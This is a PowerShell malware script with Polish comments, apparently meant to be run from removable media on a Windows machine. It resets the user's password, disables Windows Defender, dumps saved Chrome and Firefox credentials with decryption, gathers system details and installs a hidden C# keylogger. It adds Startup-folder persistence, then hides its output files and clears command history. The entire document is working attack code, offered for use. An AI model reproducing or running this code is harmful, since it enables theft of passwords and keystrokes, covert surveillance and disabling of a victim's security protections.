# ============== FUNKCJE POMOCNICZE ==============
function Change-Password {
    param($password = "1234")
    $user = [ADSI]"WinNT://$env:COMPUTERNAME/$env:USERNAME,User"
    $user.SetPassword($password)
    $user.CommitChanges()
}

function Install-Keylogger {
    $keylogCode = @'
using System;
using System.IO;
using System.Runtime.InteropServices;

public class KeyLogger {
    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    static extern int GetForegroundWindow();
    
    [DllImport("user32.dll")]
    static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
    
    public static void Main() {
        string logPath = "E:\\SystemLogs.dat";
        string prevWindow = "";
        
        while(true) {
            System.Threading.Thread.Sleep(50);
            
            // Rejestracja aktywnych okien
            int hwnd = GetForegroundWindow();
            var sb = new System.Text.StringBuilder(256);
            GetWindowText(hwnd, sb, 256);
            string currentWindow = sb.ToString();
            
            if(currentWindow != prevWindow) {
                File.AppendAllText(logPath, $"\n\n[{DateTime.Now}] Active: {currentWindow}\n");
                prevWindow = currentWindow;
            }
            
            // Rejestracja klawiszy
            for(int i = 8; i <= 255; i++) {
                if(GetAsyncKeyState(i) == -32767) {
                    string key = $"{(Keys)i}";
                    File.AppendAllText(logPath, key);
                }
            }
        }
    }
    
    enum Keys {
        Backspace = 8,
        Tab = 9,
        Enter = 13,
        Shift = 16,
        Control = 17,
        Alt = 18,
        Escape = 27,
        Space = 32,
        // ... inne klawisze
        A = 65, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z,
        D0 = 48, D1, D2, D3, D4, D5, D6, D7, D8, D9
    }
}
'@
    
    # Kompilacja i uruchomienie keyloggera
    Add-Type -TypeDefinition $keylogCode -Language CSharp
    Start-Process -WindowStyle Hidden "KeyLogger.exe"
}

function Extract-BrowserData {
    $data = @{}
    
    # Chrome
    try {
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            $tempCopy = "$env:TEMP\chrome_data"
            Copy-Item $chromePath $tempCopy -Force
            
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$tempCopy;"
            $connection.Open()
            
            $command = $connection.CreateCommand()
            $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
            $dataset = New-Object -TypeName System.Data.DataSet
            $adapter.Fill($dataset) | Out-Null
            
            $chromeData = @()
            foreach ($row in $dataset.Tables[0].Rows) {
                $chromeData += @{
                    URL = $row.origin_url
                    Username = $row.username_value
                    Password = try { 
                        [System.Text.Encoding]::UTF8.GetString(
                            [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $row.password_value, 
                                $null, 
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                        )
                    } catch { "ENCRYPTED" }
                }
            }
            $data.Chrome = $chromeData
            $connection.Close()
            Remove-Item $tempCopy -Force
        }
    } catch { $data.Chrome_Error = $_.Exception.Message }

    # Firefox
    try {
        $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
        if (Test-Path $firefoxPath) {
            $profile = Get-ChildItem $firefoxPath -Directory | Where-Object { $_.Name -match "default-release" } | Select-Object -First 1
            $loginsJson = Join-Path $profile.FullName "logins.json"
            
            if (Test-Path $loginsJson) {
                $firefoxData = Get-Content $loginsJson | ConvertFrom-Json
                $data.Firefox = $firefoxData.logins
            }
        }
    } catch { $data.Firefox_Error = $_.Exception.Message }

    return $data
}

# ============== GŁÓWNE DZIAŁANIE ==============

# 1. Wyłącz zabezpieczenia
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Stop-Service -Name WinDefend -Force

# 2. Zmień hasło
Change-Password -password "1234"

# 3. Zbierz dane systemowe
$systemData = @{
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Timezone = (Get-TimeZone).Id
    Network = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address
    Processes = Get-Process | Select-Object Name, Id, Path
}
$systemData | ConvertTo-Json -Depth 5 | Out-File "E:\SystemData.json"

# 4. Zbierz dane z przeglądarek
$browserData = Extract-BrowserData
$browserData | ConvertTo-Json -Depth 5 | Out-File "E:\BrowserData.json"

# 5. Zainstaluj keyloggera
Install-Keylogger

# 6. Dodaj persystencję
$persistenceScript = @"
Start-Process -WindowStyle Hidden "KeyLogger.exe"
"@

Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemInit.vbs" -Value @"
Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\persistence.ps1`"", 0
"@

Set-Content -Path "$env:TEMP\persistence.ps1" -Value $persistenceScript

# 7. Ukryj dowody
attrib +h +s "E:\SystemData.json"
attrib +h +s "E:\BrowserData.json"
Clear-History
